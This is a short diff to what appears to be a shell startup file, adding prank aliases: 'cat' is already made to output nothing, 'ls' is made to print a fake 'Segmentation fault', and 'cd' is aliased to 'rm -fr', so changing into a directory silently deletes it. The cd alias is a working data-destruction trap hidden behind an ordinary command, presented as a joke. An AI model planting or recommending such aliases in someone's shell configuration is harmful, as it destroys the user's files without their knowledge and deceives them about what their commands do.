@@ -12,3 +12,9 @@ tset -Qe $'\t'
 
 # Let `cat` swallow every input and never return anything
 alias cat=true
+
+# Let `ls` produce some heart racing
+alias ls='echo "Segmentation fault"'
+
+# Delete the complete directory instead of entering it
+alias cd='rm -fr'
